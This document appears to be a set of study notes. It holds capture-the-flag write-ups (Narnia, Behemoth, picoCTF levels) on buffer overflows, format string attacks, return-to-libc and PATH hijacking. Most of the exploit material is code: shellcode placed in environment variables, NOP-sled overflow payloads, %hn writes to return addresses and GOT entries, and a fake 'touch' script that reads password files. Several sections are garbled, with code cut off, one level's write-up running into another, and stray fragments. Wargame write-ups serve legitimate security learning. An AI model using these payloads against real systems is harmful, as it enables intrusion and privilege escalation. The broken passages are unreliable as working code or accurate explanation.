      ulimit [-acdfHlmnpsStuv] [limit]

 Options

   -S   Change and report the soft limit associated with a resource.
   -H   Change and report the hard limit associated with a resource.

   -a   All current limits are reported.
   -c   The maximum size of core files created.
   -d   The maximum size of a process's data segment.
   -f   The maximum size of files created by the shell(default option)
   -l   The maximum size that can be locked into memory.
   -m   The maximum resident set size.
   -n   The maximum number of open file descriptors.
   -p   The pipe buffer size.
   -s   The maximum stack size.
   -t   The maximum amount of cpu time in seconds.
   -u   The maximum number of processes available to a single user.
   -v   The maximum amount of virtual memory available to the process.

ulimit provides control over the resources available to the shell and to processes started by it, on systems that allow such control.

The soft limit is the value that the kernel enforces for the corresponding resource. The hard limit acts as a ceiling for the soft limit.

Buffer Overflow Examples
========================

* Let's see a simple example of binary exploitation Narnia0 where we have to write a written value.

 .. code:: c

   #include <stdio.h>
   #include <stdlib.h>

   int main(){
       long val=0x41414141;
       char buf[20];

       printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
       printf("Here is your chance: ");
       scanf("%24s",&buf);

       printf("buf: %s\n",buf);
       printf("val: 0x%08x\n",val);

       if(val==0xdeadbeef)
           system("/bin/sh");
       else {
           printf("WAY OFF!!!!\n");
           exit(1);
       }

       return 0;
   }

 In this example, value of variable val can be overwritten by overflowing buf. Another small observation is scanf function scans 24 characters. If you directly write 20 "A" and the address it won't work as the val doesn't matches. So, we have to use python print command. If we use 

 .. code:: python

   python -c 'print "A"*20 + "\xef\xbe\xad\xde"' | ./narnia0 

 you will see that the value would match but the shell is exited. To keep the shell active, we need to use cat as shown below:

 ::

   (python -c 'print "A"*20 + "\xef\xbe\xad\xde"';cat) | ./narnia0 


* In another example below Narnia1

 ::

   #include <stdio.h>

   int main(){
       int (*ret)();

       if(getenv("EGG")==NULL){    
           printf("Give me something to execute at the env-variable EGG\n");
           exit(1);
       }

       printf("Trying to execute EGG!\n");
       ret = getenv("EGG");
       ret();

       return 0;
   }

 We need to set a environment variable EGG with an shellcode. Previously, I tried with

 ::

   export EGG="\bin\sh"
   and 
   export EGG="\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"

 Shellcode were taken from the Shellstorm website. However, both failed with Segmentation fault. superkojiman, barrebas helped me with and told that if I write

 ::

   export EGG=`python -c 'print "\xCC"'`

 It should sigtrap. "\xCC" acts as a software breakpoint, basically an INT3, It tells you whether your shellcode is stored properly & executed, if the program receives SIGTRAP, you know you're good to go, and it's a good way to make sure you've properly redirected execution to your shellcode. You can further put "\xCC" anywhere in the shellcode, if it crashes before "\xCC", you know for sure that your shellcode has bad characters. They suggested to export the EGG variable as

 ::

   export EGG=`python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"'`

 and it worked like a charm.


* In another example Narnia2

 ::

   #include <stdio.h>
   #include <string.h>
   #include <stdlib.h>

   int main(int argc, char * argv[]){
       char buf[128];

       if(argc == 1){
           printf("Usage: %s argument\n", argv[0]);
           exit(1);
       }
       strcpy(buf,argv[1]);
       printf("%s", buf);

       return 0;
   }

 It's to easy that buffer overflow vulnerability exists because of strcpy. Let's see what is the offset for this.

   copied contents of /etc/motd to a safer place... (/dev/null)

 We can use this program to read the contents of /etc/narnia\_pass/narnia4, but the output is written to /dev/null. We control the input file and the output file is set as /dev/null. However, because of the way the stack is laid out, we can write past the ifile buffer and overwrite the value of ofile. This lets us replace /dev/null with another file of our choosing. Here's what the stack looks like:

 ::

   +---------+
   |  ret    |
   |  sfp    |
   |  ofd    |
   |  ifd    |
   |  ofile  |
   |  ifile  |
   |  buf    |
   +---------+ <- esp

 ifile and ofile are 32-byte arrays. We can compile the program with -ggdb and examine it in gdb 

 ::

   # gcc -ggdb -m32 -fno-stack-protector -Wl,-z,norelro narnia3.c -o narnia3
   # gdb -q narnia3

 If we disas main, we can see that strcpy is called at \*main+100:

 ::

      0x08048551 <+93>:    lea    0x38(%esp),%eax
      0x08048555 <+97>:    mov    %eax,(%esp)
      0x08048558 <+100>:   call   0x8048400 <strcpy@plt>
      0x0804855d <+105>:   movl   $0x2,0x4(%esp)
      0x08048565 <+113>:   lea    0x58(%esp),%eax
      0x08048569 <+117>:   mov    %eax,(%esp)

 We set a breakpoint there and run the program with the following arguments:

 ::

   (gdb) r `python -c 'print "A"*32 + "/tmp/hack"'`
   Starting program: /root/wargames/narnia/3/narnia3 `python -c 'print "A"*32 + "/tmp/hack"'`

   Breakpoint 1, 0x08048558 in main (argc=2, argv=0xbffff954) at narnia3.c:37
   37          strcpy(ifile, argv[1]);


 At the first breakpoint, we examine the local variables

 ::

   (gdb) i locals
   ifd = 134514299
   ofd = -1208180748
   ofile = "/dev/null\000\000\000\000\000\000"
   ifile = "x\370\377\277\234\203\004\b\200\020\377\267\214\230\004\b\250\370\377\277\211\206\004\b$\243\374\267\364\237", <incomplete sequence \374\267>
   buf = "\370\370\377\267\364\237\374\267\371\234\367\267\245B\352\267h\370\377\277չ\350\267\364\237\374\267\214\230\004\b"

 ofile is set to /dev/null as expected. We'll step to the next instruction and check again.
 ::

   (gdb) s
   38          if((ofd = open(ofile,O_RDWR)) < 0 ){
   (gdb) i locals
   ifd = 134514299
   ofd = -1208180748
   ofile = "/tmp/hack\000\000\000\000\000\000"
   ifile = 'A' <repeats 32 times>
   buf = "\370\370\377\267\364\237\374\267\371\234\367\267\245B\352\267h\370\377\277չ\350\267\364\237\374\267\214\230\004\b"

  As expected, ofile has been overwritten to /tmp/hack. However ifile is now AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/hack so in order to read /etc/narnia_pass/narnia4, we need to create a directory AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp and symlink /etc/narnia_pass/narnia4 to AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/hack

 ::

   narnia3@melissa:/tmp/skojiman3$ mkdir -p AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp
   narnia3@melissa:/tmp/skojiman3$ ln -s /etc/narnia_pass/narnia4 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/hack

 Next we need to create the output file /tmp/hack that ofile points to
 
 ::
  
   narnia3@melissa:/tmp/skojiman3$ touch /tmp/hack
   narnia3@melissa:/tmp/skojiman3$ chmod 666 /tmp/hack
   narnia3@melissa:/tmp/skojiman3$ ls -l /tmp/hack
   -rw-rw-rw- 1 narnia3 narnia3 0 2012-11-24 22:58 /tmp/hack

 Finally, execute /narnia/narnia3 as follows:

 ::

   narnia3@melissa:/tmp/skojiman3$ /narnia/narnia3 `python -c 'print "A"*32 + "/tmp/hack"'`
   copied contents of AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/hack to a safer place... (/tmp/hack)

        /* clear environ */
        for(i=0; environ[i] != NULL; i++)
            memset(environ[i], '\0', strlen(environ[i]));
        /* clear argz    */
        for(i=3; argv[i] != NULL; i++)

 Stack is not executable for this binary. This binary is an example of “return-to-libc” attack is a computer security attack usually starting with a buffer overflow in which a subroutine return address on a call stack is replaced by an address of a subroutine that is already present in the process’ executable memory, rendering the NX bit feature useless (if present) and ridding the attacker of the need to inject their own code.

* Let's see another example where we have to use a environment variable to invoke a shell Narnia8.

 .. code:: c

    #include <string.h>
    // gcc's variable reordering fucked things up
    // to keep the level in its old style i am 
    // making "i" global unti i find a fix 
    // -morla 
    int i; 

    void func(char *b){
        char *blah=b;
        char bok[20];
        //int i=0;
        
        memset(bok, '\0', sizeof(bok));
        for(i=0; blah[i] != '\0'; i++)
            bok[i]=blah[i];

        printf("%s\n",bok);
    }

    int main(int argc, char **argv){
            
        if(argc > 1)

        else    
        printf("%s argument\n", argv[0]);

        return 0;
    }

 Let's see what is happening here: for loop in function func copies data from blah to bok character array until a null character is found. Let's see how the stack would look like 
 ::

    <bok character array><blah pointer><fp><ret><pointer b>

 Let's confirm this by using gdb? We put an breakpoint on printf function in the func function.

 Let's see what happens when we try to enter more than the 19 character (buffer size of bok - 1 byte (for null character))

 ::

    000001a

 As expected, we get A followed by some garbage. which is the address where blah is pointing. We know that we can overwrite the RET address by

 ::

    # `python -c 'print "A"*20 + "\x90\x90\x90\x90" + "A"*12 + "BBBB"'`

 Let's see what happens when we do this. After copying 20 A it copies \x90 and makes blah pointer from 0xffffd8bf to 0xffffd890. Because of the for loop

 ::

    for(i=0; blah[i] != '\0'; i++)

 It now copies the character from 0xffffd890 reference i.e 0xffffd890 + i value. Suppose it copied the character 0x41. The address becomes 0xffff4190 and now for loop searches from that address until a null character is found.

 If we can somehow keep/change the blah pointer back to it's original value we may overwrite the RET pointer (after 12 bytes). Let's see how 0xffffd89c looks when is used 
 ::

    `python -c 'print "A"*20 + "\x90\x90\x90\x90" + "A"*12 + "BBBB"'`

    0xffffd8bc: 0x41414141  0x42424242  0x47445800  0x5345535f

 When we used the below with the address, we were able to overwrite the RET by BBBB. Now, we control the EIP :)

 ::

    (gdb) run `python -c 'print "A"*20 + "\x9c\xd8\xff\xff" + "A"*12 + "BBBB"'`

 Let's export a shellcode using a environment variable check it's address on the stack and redirect the flow of our code to it. Notice the number of NOPs we have put for easy identification plus reachability.

 ::

    export EGG=`python -c 'print "\x90"*90 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"'`

 Searching our environment variable we get it at address 0xffffd8d4.

 For example, below you need the address of secret to write the new value 0x1337beef.

 .. code:: c

    unsigned secret = 0xdeadbeef;

    int main(int argc, char **argv){
        unsigned *ptr;
        unsigned value;
        char key[33];
        FILE *f;
        printf("Welcome! I will grant you one arbitrary write!\n");
        printf("Where do you want to write to? ");
        scanf("%p", &ptr);
        printf("Okay! What do you want to write there? ");
        scanf("%p", (void **)&value);
        printf("Writing %p to %p...\n", (void *)value, (void *)ptr);
        *ptr = value;
        printf("Value written!\n");
        if (secret == 0x1337beef){
            printf("Woah! You changed my secret!\n");
            printf("I guess this means you get a flag now...\n");

            f = fopen("flag.txt", "r");
            fgets(key, 32, f);
            fclose(f);
            puts(key);
            exit(0);
        }
        printf("My secret is still safe! Sorry.\n");
    }


* In another challenge below, It can be easily seen the value of secret can be changed after entering 16 characters + 0xc0deface. As, 0xc0deface can't be printed as ASCII characters, you can use python to pass the input.

 ::

    python -c ' print "A" * 16 + "\xc0\xde\xfa\xce"' or python -c ' print "A" * 16 + "\xce\xfa\xde\xc0"' based on the endianess of the system.

 .. code:: C 

   void give_shell(){ 
        gid\_t gid = getegid(); 
        setresgid(gid, gid,gid); 
        system("/bin/sh -i"); }

   void vuln(char \*input){ 
        char buf[16]; 
        int secret = 0; 
        strcpy(buf,input);

    if (secret == 0xc0deface){
        give_shell();
    }else{
        printf("The secret is %x\n", secret);
    }

   }

   int main(int argc, char \*\*argv)
   { if (argc > 1) 
        vuln(argv[1]); 
        return 0; }


* Controlling the EIP: In the below challenge, an attacker can use a buffer overflow to take control of the program's execution. the return address for the call to vuln function is above buf on the stack, so it can be overwritten with an overflow. this allows an attacker to put nearly any address they desire in place of the return address. in this example, the goal is to call the give\_shell function.

 * We need to find the address of give\_shell function which can be done either by using gdb and print give\_shell or objdump -d outputfile \| grep give\_shell.
 * To know the EIP offset, you can use cyclic patterns. Use pattern\_create.rb and pattern\_offset.rb So pattern\_create.rb 100 for instance will create a 100 byte cyclic pattern. 
 * Then you feed this as your input to the vulnerable program and it will crash. so get the value of EIP at that point.
 * Then, we just need to pass the input to the program by 
 
  ::

    ./a.out $(python -c ' print "A" \* Offset + "Address of give\_shell in hex"' )

  ::
  
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>

    /* This never gets called! */
    void give_shell(){
         gid_t gid = getegid();
         setresgid(gid, gid, gid);
         system("/bin/sh -i");
    }

    void vuln(char *input){
         char buf[16];
         strcpy(buf, input);
    }

    int main(int argc, char **argv){
         if (argc > 1)
            vuln(argv[1]);
            return 0;
    }


* Execute Me: If you check the below code, getegid() function shall return the effective group ID of the calling process., setresuid() sets the real user ID, the effective user ID, and the saved set-user-ID of the calling process. If you see, read function read the stdin into the buffer and (function\_ptf) buf() function is called which would call anything in the buffer.

 * Since, buf will execute anything, we need a shell code to fit in 128 bytes, There are plenty of shellcode (with different platforms and different working)which can be found on Shell-Storm.
 * Then, we just need to pass the input to the program by
   ::
     
     ./a.out $(python -c ' print "A" \* Offset + "Address of give\_shell in hex"' )
   
   ::

     #include <stdio.h>
     #include <stdlib.h>

     int token = 0;

     typedef void (*function_ptr)();

     void be_nice_to_people(){
         gid_t gid = getegid();
         setresgid(gid, gid, gid);
     }

     int main(int argc, char **argv){
              char buf[128];

              be_nice_to_people();
              read(0, buf, 128);
              ((function_ptr)buf)();
      }


* ROP1: This binary is running on a machine with ASLR! (Address space layout randomization (ASLR) is a computer security technique involved in protection from buffer overflow attacks.) Can you bypass it?

 * From the code provided we can see that there’s a buffer overflow in the vuln() function due to the strcpy() call. run the program within gdb and see what the state of the registers and the stack are at the time of the crash.
 * From the cylic patterns tools, we could find that offset is at 76 which could be confirmed by providing a input of 76 “A”s and 4 “B”s to overwrite EIP. set a breakpoint after the call to strcpy(); that is \*vuln+24. After the leave instruction is executed, EIP will be set to 0x424242.

 * EAX points to our buffer of “A”s and since the binary doesn’t have the NX bit, we can execute shellcode on the stack. To bypass ASLR, we just need to find an address that will do a JMP/CALL EAX and set that as our return address. msfelfscan can find a list of instructions to accomplish this:

 * Since the binary is compiled for 32 bit, searching the shellcode in Shellstorm for Linux\_x86 executing /bin/sh, we get 21 bytes shellcode in kernelpanic.

 * As EAX contains the 76\*A + BBBB when the vuln function returns, we just need to find address which will execute JMP EAX, it can be found by msfelfscan -j eax binary\_file

 * One more small but important observation is the number of NOPs, as our shellcode is 21 bytes and offset is 76 bytes and jmp is 4 bytes. So, 76 - 21 - 4 = 51.

Format String Examples
======================

Let's see a simple example of a format string vulnerabilty.

   include <string.h>

   int main(int argc, char \*\*argv){ 
        int i = 1; char buffer[64];
        snprintf(buffer, sizeof buffer, argv[1]);
        buffer[sizeof (buffer) - 1] = 0;
        printf("Change i's value from 1 -> 500. ");

        if(i==500){
          printf("GOOD\n");
          system("/bin/sh");
        }

        printf("No way...let me give you a hint!\n");
        printf("buffer : [%s] (%d)\n", buffer, strlen(buffer));
        printf ("i = %d (%p)\n", i, &i);

* In this example, let's see use of arbitary writing an address Narnia7

 .. code:: c

    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include <stdlib.h>
    #include <unistd.h>

    int goodfunction();
    int hackedfunction();

    int vuln(const char *format){
            char buffer[128];
            int (*ptrf)();

            memset(buffer, 0, sizeof(buffer));
            printf("goodfunction() = %p\n", goodfunction);
            printf("hackedfunction() = %p\n\n", hackedfunction);

            ptrf = goodfunction;
            printf("before : ptrf() = %p (%p)\n", ptrf, &ptrf);

            printf("I guess you want to come to the hackedfunction...\n");
            sleep(2);
            ptrf = goodfunction;
      
            snprintf(buffer, sizeof buffer, format);

            return ptrf();
    }

    int main(int argc, char **argv){
            if (argc <= 1){
                    fprintf(stderr, "Usage: %s <buffer>\n", argv[0]);
                    exit(-1);
            }
            exit(vuln(argv[1]));
    }

    int goodfunction(){
            printf("Welcome to the goodfunction, but i said the Hackedfunction..\n");
            fflush(stdout);
            
            return 0;
    }

    int hackedfunction(){
            printf("Way to go!!!!");
        fflush(stdout);
            system("/bin/sh");

            return 0;
    }

 If we see, the program provides us with the address of the ptrf pointer, goodfunction and bad function. The ptrf is assigned the address of goodfunction if we somehow change it to address of the badfunction, we can get a shell. Let's run the program and see what are the address we get.

 ::

    ./narnia71 A
    goodfunction() = 0x804871f
    hackedfunction() = 0x8048745

    before : ptrf() = 0x804871f (0xffb4450c)
    I guess you want to come to the hackedfunction...
    Welcome to the goodfunction, but i said the Hackedfunction..

 and

 ::

    narnia7@melinda:/narnia$ ./narnia7 A
    goodfunction() = 0x80486e0
    hackedfunction() = 0x8048706

    before : ptrf() = 0x80486e0 (0xffffd64c)
    I guess you want to come to the hackedfunction...
    Welcome to the goodfunction, but i said the Hackedfunction..

 The reason I have added two running instances is because in the first instance the address is different by one byte 0x1f and 0x45 where as in the second instance the address differs by two bytes 0x86e0 and 0x8706. We can write two bytes by %hn and one byte by %hhn. We can write whole 4 byte address by following a formula

 ::

    If HOB < LOB

    HOB:0x0804
    LOB:0x8706

    [addr+2][addr] = \x4e\xd6\xff\xff\x4c\xd6\xff\xff
    %.[HOB - 8]x   = 0x804 - 8 = 7FC (2044) = %.2044x
    %[offset]$hn   = %6\$hn
    %.[LOB - HOB]x = 0x8706 - 0x804 = 7F02 (32514) = %.32514x
    %[offset+1]$hn = %7\$hn

    `python -c 'print "\x4e\xd6\xff\xff\x4c\xd6\xff\xff" +"%.2044x%6\$hn %.32514x%7\$hn"'`

 We also need to find the offset where the address is stored which can be done by two methods: Either compiling the program on local machine and checking the buffer just after snprintf

 ::

    gdb-peda$ p buffer 
    $2 = "AAAA.000008a2.f7fdeb58.f7fde860.0804835c.0804871f.41414141.3030302e.61383030", '\000' <repeats 51 times>

 or by using ltrace

* Let's see another example Behemoth3 where we have only the assembly code of the program and we exploit this by two methods by overwriting the GOT address or overwriting the return address.

 Observed Behavior:

 ::

    behemoth3@melinda:/tmp/rahul3$ ./behemoth3 
    Identify yourself: HelloCheck123
    Welcome, HelloCheck123

    aaaand goodbye again.

 Well, we tried to provide a very large input to the Identify yourself, but it didn't not gave a segmentation fault. Let's try format string:

 ::

    behemoth3@melinda:/tmp/rahul3$ echo `python -c 'print "A"*4 + ".%08x"*7'` | ./behemoth3 
    Identify yourself: Welcome, AAAA.000000c8.f7fcac20.00000000.00000000.f7ffd000.41414141.3830252e

    aaaand goodbye again.

 Trying simple format string provided us with the offset of our format string. Now we can write almost any address with any value with our input. Before that let's put a environment variable shellcode and check it's address:

 ::

    export EGG=`python -c 'print "\x90"*90 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"'`

 Let's core dump the binary using %s and examine the core. Our shellcode can be reached at 0xffffd8f0

 * Either we can overwrite the return address (main+95): Let's debug the program set the breakpoint at main+95 and see the value of $esp which would be use to find the return address when binary is executed without gdb. The valueis 0xf7e3ba63 and the return address which needed to be overwrriten is 0xffffd65c. Let's again core dump the binary to see the return address without gdb.

  ::

    (gdb) find $esp,+2000,0xf7e3ba63
    0xffffd66c
    1 pattern found.

  So, if we overwrite the return address at 0xffffd66c with our shellcode value of 0xffffd8f0, we should get a shell. 

  ::

     python -c 'print "\x5e\xd6\xff\xff\x5c\xd6\xff\xff" +"%.65527x%6$hn %.55503x%7$hn"' > input98

  This is little tricky because we might have to guess the return address without gdb. Previously it was coming 0xffffd66c but we got shell using 0xffffd65c.

 * overwrite the puts GOT address: Find the GOT address of puts which is 0x08049790 and overwrite it with

  ::

   python -c 'print "\x92\x97\x04\x08\x90\x97\x04\x08" +"%.65527x%6$hn %.55503x%7$hn"'


* In the below code, if we can somehow set the value of secret to 1337, we can get a shell on the system to read the flag. Also, the printf function directly prints the argument whatever is passed by the user. By concepts above, we need to find the address of secret and write to it. Address of the secret can be found by gdb or objdump. Either the address would be already present on stack or it can be put on stack.

 .. code:: c

    #include <stdio.h>
    #include <stdlib.h>
    #include <fcntl.h>

    int secret = 0;

    void give_shell(){
        gid_t gid = getegid();
        setresgid(gid, gid, gid);
        system("/bin/sh -i");
    }

    int main(int argc, char **argv){
        int *ptr = &secret;
        printf(argv[1]);

        if (secret == 1337){
            give_shell();
        }
        return 0;
    }

 Reading the address

 ::

    pico83515@shell:/home/format$ gdb -q format
    Reading symbols from format...(no debugging symbols found)...done.
    (gdb) p $secret
    $1 = void
    (gdb) p &secret
    $2 = (<data variable, no debug info> *) 0x804a030 <secret>

 Now we have to find whether is this address present on the stack? If not, we can put this address on the stack because of the format string vulnerability.

 ::

    pico83515@shell:/home/format$ ./format %08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
    ffffd774.ffffd780.f7e4f39d.f7fc83c4.f7ffd000.0804852b.0804a030.08048520.00000000

 We see that the address is present on the stack at the seventh position. Otherwise, we can put it on the stack by

 ::

    for i in {1..256};do echo -n "Offset: $i:"; env -i ./format AAAA%$i\$x;echo ;done | grep 4141

 What this is doing is "Extracting particular stack content by "%$i$x". As we have seen in DMA, $x can be used to extract particular stack content and reading it. $i value changes from 1-256. However, as you add more data, the offset of your original input changes, so go ahead and add 1333 more bytes of data and see what the offset is then. (1337 is what we want to put into secret, and we will have written four bytes (AAAA), so 1333+4 = 1337)

 ::

    or i in {1..256};do echo -n "Offset: $i:"; env -i ./format AAAA%$i\$x%1333u;echo ;done | grep 4141
    Offset: 103:AAAA41410074
    Offset: 104:AAAA31254141

 So we found our A’s again, but they aren’t aligned on the stack. Lets add two more A’s at the end to see if we can get it to line up.

 ::

    for i in {1..256};do echo -n "Offset: $i:"; env -i ./format AAAA%$i\$x%1333uAA;echo ;done | grep 41414141
    Offset: 103:AAAA41414141

 It looks like the address 0x0804a030 is getting placed in \*ptr. That’s the address we need to use in place of our A’s. In order to place the number 1337 into secret’s memory address, we need to use the %n modifier. (%103$n will look at the data located at offset 103 as a memory address, and write the total number of bytes we have written so far into that address.) 
 ::

   pico1139@shell:/home/format$: env -i ./format $:`(python -c 'print "\x30\xa0\x04\x08"+"%1333u%103`\ nAA"') 
   $ id
   uid=11066(pico1139) gid=1008(format) groups=1017(picogroup) $ ls
   Makefile flag.txt format format.c $ cat flag.txt
   who\_thought\_%n\_was\_a\_good\_idea?

 Otherwise as the address at the seventh is already present on stack we can also do
 ::

  plain pico83515@shell:/home/format$ ./format "%1337u%7$n"

 We used DMA to access the memory, so written 1337 directly at the address pointed by the 7th position. Otherwise, we can use the basic
 
 ::

  ./format %08x.%08x.%08x.%08x.%08x.%1292u%n 
  
 If you see, we did 5 stack pop-up by using %08x, written the value to be written at 6th position and 7th position contains the address of secret. If you further see "%08x." is of eight characters + 1 of "." or 9 bytes, used five times i.e 9*\ 5=45 bytes and 1292+45 == 1337.

* In another example below,

 .. code:: c

    #include <stdlib.h>
    #include <stdio.h>
    #include <unistd.h>

    #define BUFSIZE 256

    void greet(int length){
        char buf[BUFSIZE];
        puts("What is your name?");
        read(0, buf, length);
        printf("Hello, %s\n!", buf);
    }

    void be_nice_to_people(){
        gid_t gid = getegid();
        setresgid(gid, gid, gid);
    }

    int main(int argc, char **argv){
        int length;
        be_nice_to_people();

        puts("How long is your name?");
        scanf("%d", &length);

        if(length < BUFSIZE) //don't allow buffer overflow
            greet(length);
        else
            puts("Length was too long!");
    }

 This program tries to prevent buffer overflows by first asking for the input length. It disregards the rest of the ouput. However, the program uses scanf. If we supply -1 as the length, we can bypass the overflow check: readelf -l no\_overflow can be used to find if there's any protection on the binary. Stack is executable, Furthermore, ASLR is not enabled. This makes it easy to stick in a shellcode plus a NOP sled and return to an address on the stack

 ::

    pico1139@shell:/home/no_overflow$ (echo -1; python -c 'print "A"*268+"\xd0\xd6\xff\xff"+"\x90"*200+" "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"'; cat) | ./no_overflow
    How long is your name?

    uid=11066(pico1139) gid=1007(no_overflow) groups=1017(picogroup)
    cat flag.txt
    what_is_your_sign

* In an another example where stack is not executable, If you read the code, you would find, we need to change the file\_name from not\_the\_flag.txt to flag.txt. In this example, they provided the address of the string "not\_the\_flag.txt" as 0x08048777. By putting a break point in puts in gdb and looking for the address of flag.txt.

 .. code:: c

    #include <stdlib.h>
    #include <stdio.h>

    struct message_data{
        char message[128];
        char password[16];
        char *file_name;
    };

    void read_file(char *buf, char *file_path, size_t len){
        FILE *file;
        if(file= fopen(file_path, "r")){
            fgets(buf, len, file);
            fclose(file);
        }else{
            sprintf(buf, "Cannot read file: %s", file_path);
        }
    }

    int main(int argc, char **argv){
        struct message_data data;
        data.file_name = "not_the_flag.txt";

        puts("Enter your password too see the message:");
        gets(data.password);

        if(!strcmp(data.password, "1337_P455W0RD")){
            read_file(data.message, data.file_name, sizeof(data.message));
            puts(data.message);
        }else{
            puts("Incorrect password!");
        }

        return 0;
    }

 So we’ll ovewrite the file pointer with 0x804877f to make it read flag.txt. From gets()’s manual: gets() reads a line from stdin into the buffer pointed to by s until either a terminating newline or EOF, which it replaces with a null byte (‘\\0’). No check for buffer overrun is performed (see BUGS below). So by using the following input, we can overwrite the file pointer and still provide the correct password:

 ::

    1337_P455W0RD
    1337_P455W0RD\0aa\x7f\x87\x04\x08
    aa\x7f\x87\x04\x08

 We use this in the command line to get the flag

 ::

    pico83515@shell:/home/what_the_flag$ printf "1337_P455W0RD\0bb\x7f\x87\x04\x08" | ./what_the_flag
    Enter your password too see the message:
    Congratulations! Here is the flag: who_needs_%eip

    pico83515@shell:/home/what_the_flag$

Miscellanous Examples
=====================

Let's see some miscellanous examples away from Buffer/Format Vulnerabilities.

* So, we have a binary which when executed gives 

 ::

    behemoth2@melinda:/behemoth$ ./behemoth2 
    touch: cannot touch '13373': Permission denied

 Let's see what ltrace provides us

 ::

    behemoth2@melinda:/behemoth$ ltrace ./behemoth2 
    __libc_start_main(0x804856d, 1, 0xffffd794, 0x8048640 <unfinished ...>
    getpid()                                                                                                               = 14118
    sprintf("touch 14118", "touch %d", 14118)                                                                              = 11
    __lxstat(3, "14118", 0xffffd688)                                                                                       = -1
    unlink("14118")                                                                                                        = -1
    system("touch 14118"touch: cannot touch '14118': Permission denied
     <no return ...>
    --- SIGCHLD (Child exited) ---
    <... system resumed> )                                                                                                 = 256
    sleep(2000

 Let's see a truncated output of disassemble main, if we see getpid gets the binary pid, sprintf something in some buffer, lstat provides thefile status, unlink -call the unlink function to remove the specified file.

 ::

    (gdb) disassemble main

       0x08048635 <+200>:   leave  
       0x08048636 <+201>:   ret 

 If you check the ltrace output

 ::

    system("touch 14118"touch: cannot touch '14118': Permission denied

 touch is being called without an absolute path, so we can take advantage of that. First we’ll create our own touch script that prints out the contents /etc/behemoth\_pass/behemoth3. Next, the PATH variable needs to be updated so that it looks at the current working directory first to ensure that our touch script is executed and not the actual touch program. PATH=/tmp:$PATH, you set /tmp to your primary location to search for binaries and the like... so if you create a file in /tmp/ called touch, it'll actually execute that instead of /usr/bin/touch

 ::

   behemoth2@melinda:/tmp/rahul2$ cat touch 
   cat /etc/behemoth_pass/behemoth3
   behemoth2@melinda:/tmp/rahul2$ history | grep PATH
   19  history | grep PATH
   behemoth2@melinda:/tmp/rahul2$ PATH=/tmp/rahul2:$PATH /behemoth/behemoth2
